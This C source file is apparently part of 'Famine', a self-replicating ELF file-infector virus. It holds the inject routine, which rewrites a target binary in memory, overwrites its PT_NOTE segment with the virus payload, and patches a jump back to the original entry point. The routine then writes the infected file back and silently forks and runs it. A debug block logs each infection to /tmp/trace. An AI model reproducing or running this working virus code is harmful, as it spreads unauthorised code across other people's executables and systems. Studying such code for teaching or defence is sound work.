#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static void write_on_memory(const struct s_info *info, char *ptr, const size_t payload_size)
{
	char *dst = ptr;
	char *src = info->ptr;

	for (size_t index = 0; index < info->data->p_offset + info->data->p_filesz; index++)
		*dst++ = *src++;

	for (size_t index = 0; index < payload_size; index++)
		*dst++ = 0;

	for (size_t index = 0; index < info->size - (info->data->p_offset + info->data->p_filesz); index++)
		*dst++ = *src++;
}

static void replicate_on_memory(const struct s_info *info, char *ptr)
{
	char *dst;
	unsigned char *src;
	const Elf64_Addr entry_point = info->old_entry - (info->new_entry) - JMP_OFFSET;

	dst = ptr + info->note->p_offset;
	src = (unsigned char *)&__entry;

	for (size_t index = 0; index < PAYLOAD_SIZE; index++)
		*dst++ = *src++;

	_memcpy(ptr + info->note->p_offset + (JMP_OFFSET - sizeof(JMP_OPCODE)), &entry_point, sizeof(int));
}

static void replicate(const struct s_info *info)
{
	pid_t child;
	char *av[] = {info->name, NULL};

	child = _fork();

	if (child == 0)
	{
		_close(STDIN_FILENO);
		_close(STDOUT_FILENO);
		_close(STDERR_FILENO);

		_execve(av[0], av, NULL);
		_fatal(42);
	}
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void inject(struct s_info *info)
{
	char *ptr;
	const size_t payload_size = PAYLOAD_SIZE + (info->note->p_offset - (info->data->p_offset + info->data->p_filesz));
	const size_t file_size = info->size + payload_size;

	if ((ptr = _mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		return ;

	write_on_memory(info, ptr, payload_size);
	replicate_on_memory(info, ptr);

	_write(info->fd, ptr, file_size);
	_munmap(ptr, file_size);
	release_info(info);

#if DEBUG
	char name[] = "/tmp/trace";
	int fd = _open(name, O_RDWR | O_APPEND, 0000);
	char fam[] = "Famine: ";
	char des[] = " has been infected\n";

	_write(fd, fam, _strlen(fam)); 
	_write(fd, info->name, _strlen(info->name));
	_write(fd, des, _strlen(des)); 

	_close(fd);
#endif

	replicate(info);
}
